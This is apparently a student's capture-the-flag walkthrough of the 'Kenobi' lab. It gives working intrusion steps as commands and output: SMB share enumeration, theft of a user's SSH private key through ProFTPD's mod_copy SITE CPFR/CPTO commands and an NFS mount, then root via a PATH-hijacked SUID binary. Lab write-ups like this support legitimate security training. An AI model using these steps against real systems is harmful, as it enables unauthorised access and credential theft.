***KENOBI***


TASK 1: ENUMERATION:NMAP SCAN


"""
sudo nmap -sS -sV -A  10.10.187.102 -oN  nmap.txt
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-01 06:51 EST
Nmap scan report for 10.10.187.102
Host is up (0.17s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      43119/tcp   mountd
|   100005  1,2,3      55027/udp   mountd
|   100005  1,2,3      55039/tcp6  mountd
|   100005  1,2,3      58909/udp6  mountd
|   100021  1,3,4      33721/tcp   nlockmgr
|   100021  1,3,4      41115/tcp6  nlockmgr
|   100021  1,3,4      49483/udp6  nlockmgr
|   100021  1,3,4      56084/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/1%OT=21%CT=1%CU=34124%PV=Y%DS=2%DC=T%G=Y%TM=61F91ED9
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)OPS(
OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11
OS:NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(
OS:R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m01s, deviation: 3h27m51s, median: 0s
| smb2-time: 
|   date: 2022-02-01T11:51:48
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2022-02-01T05:51:48-06:00

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   173.46 ms 10.11.0.1
2   174.68 ms 10.10.187.102

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.36 seconds


"""

SENARIO 1:

WE FOUND PORT 80 open BUT WEB ONLY CONTAIN A PIC NO HINTS IN SOURCE CODE EITHER

--> GOBUSTER ON THE WEB PAGE TO FIND HIDDEN DIRECTORIES

* FOUND ADMIN.HTML PAGE FROM SCAN BUT NOTHING THEIR AS WELL

--> USAGE OF WEB ATTACKS FOR INITIAL FOOTHOLD ----> RULED OUT 

first Enumerate Samba for shares ::

tool used enum4linux

RESUTLS :


'''
 ========================================== 
|    Share Enumeration on 10.10.171.188    |
 ========================================== 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      
        IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.171.188
//10.10.171.188/print$  Mapping: DENIED, Listing: N/A
//10.10.171.188/anonymous       Mapping: OK, Listing: OK
//10.10.171.188/IPC$    [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*


'''
Stand out :
//10.10.171.188/anonymous       Mapping: OK, Listing: OK


Lets connect with smb client :

smbclient //10.10.171.188/anonymous -u anonymous

connection succeed :

we found log.txt
lets read

"""
This is a basic ProFTPD configuration file (rename it to 
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.
"""

IMPORTANT INFO FROM LOG.TXT
USER KENOBI 

Your identification has been saved in /home/kenobi/.ssh/id_rsa.

WE can connect to the ftp and copy /home/kenobi/.ssh/id_rsa. to /var mount folder which is running at 111
procedure:

"""
nc 10.10.171.188 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.171.188]
ls
500 LS not understood
ls
500 LS not understood
dir
500 DIR not understood
SITE CPRF /home/kenobi/.ssh/id_rsa
500 'SITE CPRF' not understood
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful

500 Invalid command: try being more creative
421 Login timeout (300 seconds): closing control connection

"""

NOW MAKE A MOUNT FOLDER AND CONNECT TO THE MACHINE 

command :
sudo mount -t nfs 10.10.171.188:/var /home/kali/Desktop/THM/OFFENSIVE_PENTESTING/Kenobi/TMP/Mount -nolock

copy the rsa key that we save in var/tmp derectory 


LETS CONNECT throught SSH
User name : Kenobi
Password : ssh key we just saved 


"""
┌──(kali㉿kali)-[~/Desktop/THM/OFFENSIVE_PENTESTING/Kenobi]
└─$ ls                                                                       130 ⨯
 36803.py   id_rsa   log.txt   nmap.txt  'TASK ANSWERs'   TMP
                                                                                   
┌──(kali㉿kali)-[~/Desktop/THM/OFFENSIVE_PENTESTING/Kenobi]
└─$ chmod 600 id_rsa                          
                                                                                   
┌──(kali㉿kali)-[~/Desktop/THM/OFFENSIVE_PENTESTING/Kenobi]
└─$ ssh -i id_rsa kenobi@10.10.171.188


"""
connection suucessfull:

"""

kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ cat user.txt
d0b0f3f53b6caa532a83915e19224899
kenobi@kenobi:~$ 




PRIVILLEGE ESCALATION :

finD suid bit flies :
find / -perm -u=s -type f 2>/dev/null

"""
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu ---> sus 
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6


"""
WHOLE PROCEDURE 


"""
root@kenobi:~# ls
curl  share  user.txt
root@kenobi:~# rm curl
root@kenobi:~# echo /bin/sh > curl
root@kenobi:~# chmod 777 curl
root@kenobi:~# ls
curl  share  user.txt
root@kenobi:~# chmod +x curl
root@kenobi:~# ls
curl  share  user.txt
root@kenobi:~# ./curl
# ls
curl  share  user.txt
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# ^C
# exit
root@kenobi:~# /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# 
# ls
curl  share  user.txt
# pwd
/home/kenobi
# cd ..
# ls
kenobi
# cd root
/bin/sh: 6: cd: can't cd to root
# cd /root
# ls
root.txt
# cat root.txt
177b3cd8562289f37382721c28381f02
# 


"""